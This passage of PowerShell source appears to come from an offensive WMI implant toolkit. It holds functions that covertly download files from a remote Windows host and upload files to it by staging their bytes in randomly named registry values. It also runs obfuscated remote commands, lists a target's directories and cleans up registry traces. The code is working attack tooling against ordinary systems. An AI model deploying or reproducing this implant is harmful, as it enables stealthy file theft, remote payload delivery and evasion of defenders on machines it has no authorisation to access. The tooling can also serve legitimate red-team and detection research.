        #2147483650 - hklm, 2147483649 - kkcu, 

        Write-Verbose "Creating registry key to store data"
        $fullregistrypath = "HKLM:\Software\Microsoft\Windows"
        $registryupname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        $registrydownname = -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
        # The reghive value is for hkey_local_machine
        $reghive = 2147483650
        $regpath = "SOFTWARE\Microsoft\Windows"
        $SystemHostname = Get-WMIObject Win32_ComputerSystem | Select-Object -ExpandProperty name

        if($Download)
        {
            if(!$DownloadFile)
            {
                $Download_File = Read-Host "What's the full path to the file you'd like to download? >"
                $Download_File = $Download_File.Trim()
            }
            else
            {
                $Download_File = $DownloadFile
            }

            if(!$DownloadFilePath)
            {
                $Download_File_Path = Read-Host "What's the full path to location you'd like to save the file locally? >"
                $Download_File_Path = $Download_File_Path.Trim()
            }
            else
            {
                $Download_File_Path = $DownloadFilePath
            }

            # On remote system, save file to registry
            Write-Verbose "Reading remote file and writing on remote registry"
            $remote_command = '$fct = Get-Content -Encoding byte -ReadCount 0 -Path ''' + "$Download_file" + '''; $fctenc = [Int[]][byte[]]$fct -Join '',''; New-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registrydownname'" + ' -Value $fctenc -PropertyType String -Force'

            if($Credential)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
            }

            # Start the polling process to see if the file is stored in the registry
            # Grab file from remote system's registry
            Write-Verbose "Checking if file is in the remote system's registry"
            $quit = $false
            while($quit -eq $false)
            {
                if($Credential)
                {
                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
                }
                else
                {
                    $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'GetStringValue' -ArgumentList $reghive, $regpath, $registrydownname -ComputerName $ComputerName
                }
                if($remote_reg.ReturnValue -ne 0)
                {
                    Write-Verbose "File not doing being stored in registry, sleeping for 5..."
                    Start-Sleep -s 5
                }
                else 
                {
                    $quit = $true
                }
            }
            
            $decode = [byte[]][int[]]$remote_reg.sValue.Split(',') -Join ' '
            [byte[]] $decoded = $decode -split ' '
            Set-Content -Encoding byte -Path $Download_file_path -Value $decoded

            # Removing Registry value from remote system
            Write-Verbose "Removing registry value from remote system"

            if($Credential)
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $null = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registrydownname -ComputerName $ComputerName
            }

            Write-Verbose "Done!"
        }

        elseif($Upload)
        {
            if(!$UploadFile)
            {
                $Upload_File = Read-Host "What's the full path to the file you'd like to upload? >"
                $Upload_File = $Upload_File.Trim()
            }
            else
            {
                $Upload_File = $UploadFile
            }

            if(!$UploadFilePath)
            {
                $Upload_Dir = Read-Host "What is the full path to the location you would like the file uploaded to? >"
                $Upload_Dir = $Upload_Dir.Trim()
            }
            else
            {
                $Upload_Dir = $UploadFilePath
            }

            # Read in file and base64 encode it
            Write-Verbose "Read in local file and encode it"
            $filecontents = Get-Content -Encoding byte -ReadCount 0 $Upload_File
            $filecontentencoded = [Int[]][byte[]]$filecontents -Join ','

            Write-Verbose "Writing encoded file to remote registry"
            if($Credential)
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName -Credential $Credential
            }
            else
            {
                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $ComputerName
            }
            
            # grabs registry value and saves to disk
            Write-Verbose "Connecting to $ComputerName"
            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [byte[]][int[]]$out.sValue.Split('','') -Join '' ''; [byte[]] $decoded = $decode -split '' ''; Set-Content -Encoding byte -Path ' + "$Upload_Dir" + ' -Value $decoded; Remove-ItemProperty -Path ' + "'$fullregistrypath'" + ' -Name ' + "'$registryupname'"
            if($Credential)
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
            }
            else
            {
                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -ObfuscateWithEnvVar
            }

            Write-Verbose "Remote system now is copying file from WMI property and replacing it to the original value."
        }
    } # End of Process Block
    end{}
} # End of Function block

function Invoke-LSWMImplant
{
    # This function retrieves a diretory listing of all files from a user-specified directory on the targeted system
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName,
        [Parameter(Mandatory = $False)] 
        [string]$Directory
    )

    Process
    {
        if(!$Directory)
        {
            $Directory = Read-Host "What's the full path to the directory? >"
            $Directory = $Directory.Trim()
        }

        $Drive = $Directory.Substring(0,2)
        $DirPath = $Directory.Substring(2)
        $DirPath = $DirPath.Replace("\","\\")
        if(!$DirPath.Endswith('\\'))
        {
            $DirPath += "\\"
        }
        Write-Verbose "Connecting to $ComputerName"
        $filter = "Drive='$Drive' and Path='$DirPath'"

        if($Credential)
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName -Credential $Credential
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName -Credential $Credential
        }
        else
        {
            Get-WmiObject -Class Win32_Directory -Filter $filter -ComputerName $ComputerName
            Get-WMIObject -Class CIM_Datafile -filter $filter -ComputerName $ComputerName
        }
    }
    end{}
}

function Set-OriginalProperty
{
    # This function sets the DebugFilePath property to its default value
    param
    (
        #Parameter assignment
        [Parameter(Mandatory = $False)]
        [System.Management.Automation.PSCredential]$Credential,
        [Parameter(Mandatory = $True)]
        [string]$ComputerName
    )

    Process
    {
        $default_prop_value = "%SystemRoot%\Memory.dmp"
        # Set original WMI Property Value
        $Original_WMIProperty = Get-WmiObject -Class Win32_OSRecoveryConfiguration @PSBoundParameters
        $Original_WMIProperty.DebugFilePath = $default_prop_value
        $Original_WMIProperty.Put()
    }
    end{}
}